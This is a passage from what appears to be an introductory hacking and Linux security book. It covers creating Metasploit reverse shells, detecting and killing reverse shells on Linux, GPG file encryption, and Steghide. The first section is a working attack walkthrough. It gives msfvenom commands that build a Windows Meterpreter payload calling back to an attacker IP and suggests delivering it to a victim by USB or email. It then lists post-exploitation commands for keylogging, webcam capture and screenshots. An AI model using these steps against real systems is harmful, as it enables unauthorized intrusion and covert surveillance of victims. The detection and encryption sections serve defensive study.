    # Creating Reverse Shells with Metasploit


    ![img](d2d_images/chapter_title_below.png)


    In this part of the book, you''ll learn how to create a reverse shell that works
    on a Windows machine. This type of reverse connection is perfect when the target
    is behind a firewall, because they’re the ones making the connection to you. Let’s
    start.


    Use `msfvenom` to generate a Windows executable that will call back to your attacker
    machine:


    ```

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f
    exe -o shell.exe

    ```


    - `LHOST`: your attacking machine IP.

    - `LPORT`: the port you’ll listen on.

    - `-f exe`: output format for Windows.

    - `-o shell.exe`: name of your payload.


    Once created, you''ll need to find a way to deliver this executable to the Windows
    target. This could be via USB, email, or a shared folder.


    ## Start the Listener


    Open your terminal and type:


    ```

    msfconsole

    ```


    Then configure the handler to wait for connections:


    ```

    use exploit/multi/handler

    set payload windows/meterpreter/reverse_tcp

    set LHOST 192.168.1.100

    set LPORT 4444

    run

    ```


    Metasploit is now listening for the moment the victim runs your `shell.exe`. Once
    the target runs `shell.exe`, your terminal will look like this:


    ```

    [*] Started reverse TCP handler on 192.168.1.100:4444

    [*] Sending stage...

    [*] Meterpreter session 1 opened

    meterpreter >

    ```


    You now have full control on the Windows machine. From here, you can explore files,
    take screenshots, record the microphone, and more. Here''s a list of useful commands
    you can use:


    `shell`

    Drops into a regular Windows command prompt (very powerful).


    Example:

    ```

    meterpreter > shell

    ```


    `screenshot`

    Takes a screenshot of the victim’s screen.


    Example:

    ```

    meterpreter > screenshot

    ```


    `webcam_snap`

    Takes a photo using the victim’s webcam (if available).


    Example:

    ```

    meterpreter > webcam_snap

    ```


    `keyscan_start`

    Begins logging keystrokes.


    Example:

    ```

    meterpreter > keyscan_start

    ```


    `keyscan_dump`

    Shows the keystrokes captured so far.


    Example:

    ```

    meterpreter > keyscan_dump

    ```


    Meterpreter is packed with powerful features that go way beyond what I have covered
    here. Run `help` inside Meterpreter to see a full list of commands and start experimenting.


    | ![img](d2d_images/chapter_title_corner_decoration_left.png)  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |


    ![img](d2d_images/chapter_title_above.png)


    # Detect Reverse Shells on Linux


    ![img](d2d_images/chapter_title_below.png)


    If a reverse shell is active, the system usually has an outbound connection to
    an unfamiliar IP and port.


    Try this:


    ```

    ps aux | grep bash

    ```


    Or:


    ```

    netstat -tunp

    ```


    Look for entries like this:


    ```

    tcp  ESTABLISHED  0 0 192.168.1.50:41232  192.168.1.100:4444  users:(("bash",pid=3421,fd=3))

    ```


    Notice the `bash` process connecting to a remote machine (`192.168.1.100:4444`).
    That’s suspicious!


    ## Kill a Reverse Shell


    Once you''ve identified a suspicious reverse shell process like a `bash` or `netcat`
    connection that shouldn''t be there, you can terminate it in a few quick steps.


    If you saw a suspicious connection like:


    ```

    tcp  ESTABLISHED  0 0 192.168.1.50:45555  192.168.1.100:4444  users:(("bash",pid=2983,fd=3))

    ```


    Here, the PID is `2983`. Once you have the PID, run:


    ```

    kill -9 2983

    ```


    The `-9` flag forcefully kills the process immediately.


    If there are multiple suspicious processes, you can kill them all:


    ```

    pkill -f bash

    ```


    Or more selectively:


    ```

    pkill -f "/dev/tcp"

    ```


    This targets any Bash reverse shell using TCP tricks.


    Reverse shells can be sneaky, they often look like normal system processes at
    first glance. But once you know what to look for, spotting and stopping them becomes
    much easier.


    Tools like `ps` and `netstat` help you see what''s happening under the hood, and
    a quick `kill` command can instantly cut off the attacker''s connection.


    | ![img](d2d_images/chapter_title_corner_decoration_left.png)  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |


    ![img](d2d_images/chapter_title_above.png)


    # Chapter 6: Security


    ![img](d2d_images/chapter_title_below.png)


    In this final chapter, you’ll learn to encrypt and decrypt files with GPG and
    hide sensitive information inside images with Steghide to keep secrets safe.


    You’ll also learn to spot suspicious Wi-Fi activity using Wireshark, secure your
    wireless network, and monitor your system logs for anything unusual.


    | ![img](d2d_images/chapter_title_corner_decoration_left.png)  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |


    ![img](d2d_images/chapter_title_above.png)


    # Encrypt and Decrypt Files With GPG


    ![img](d2d_images/chapter_title_below.png)


    GPG can be found in most Linux distributions out of the box. You can verify the
    version using `gpg --version` in your terminal.


    For Debian and Ubuntu-based systems, install the `gpg` package using:


    ```

    apt install gpg

    ```


    ## Encrypting a File


    The quick method for encrypting a file is to run the `gpg` command with the `-c`
    (create) option.


    ![img](d2d_images/image000.jpg)


    In my case, I’ll encrypt the `Credit-Cards.txt` file using the following command.


    ```

    gpg -c Credit-Cards.txt

    ```


    ![img](d2d_images/image041.jpg)


    GPG will ask you to put a password (twice) for the file that you’re encrypting.


    ![img](d2d_images/image015.jpg)


    At this point, if you type the `ls` command, you can see the original file intact,
    `Credit-Cards.txt`, and it adds the `.gpg` extension to the newly encrypted file.


    You should remove the original file, `Credit-Cards.txt`, so that the encrypted
    one is the only source of the information contained in it.


    Now let’s try to open the encrypted file using the `nano` text editor.


    ```

    nano Credit-Cards.txt.gpg

    ```


    ![img](d2d_images/image049.jpg)


    I cannot read the information inside the file because it’s encrypted.


    ## Decrypting a File


    Decrypting means that you remove the encryption to read the file’s contents. Use
    the following command.


    ```

    gpg -d Credit-Cards.txt.gpg

    ```


    ![img](d2d_images/image070.jpg)


    You will be prompted to enter the password to decrypt the file.


    ![img](d2d_images/image008.jpg)


    As you can see, the text file was successfully decrypted.


    The `gpg` utility has a lot of options, but encrypting and decrypting are easy
    to do and only require that you know two options for quick use: Create or encrypt
    (`-c`), decrypt (`-d`).


    | ![img](d2d_images/chapter_title_corner_decoration_left.png)  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |


    ![img](d2d_images/chapter_title_above.png)


    # Hide Secret Data Inside an Image with Steghide


    ![img](d2d_images/chapter_title_below.png)


    Steghide is a steganography tool that uses a password to hide secret files within
    an image or audio file. BMP and JPEG picture types are supported, as well as AU
    and WAV audio formats.


    This tool is useful in situations where you want to send encrypted messages or
    hide personal data.


    ## Installation


    To install Steghide, use the following command in your Linux terminal.


    ```

    apt install steghide

    ```


    Steghide should now be installed on your system. You can use `steghide --help`
    command to find all the options.


    ## Embed Data in the Image


    In this step, I have created a simple text file (`secretpass.txt`) with some passwords,
    which I will embed in my image file (`warcraft3.jpg`).


    ![img](d2d_images/image013.jpg)


    To embed the file, use the following command:


    ```

    steghide embed -ef secretpass.txt -cf warcraft3.jpg -p letmein

    ```


    The arguments are broken down as follows:


    - `-ef` specifies the file that you want to hide. In my case is `secretpass.txt`

    - `-cf` is the file that the data is embedded into. In this example, I am embedding
    in an image file called `warcraft3.jpg`.

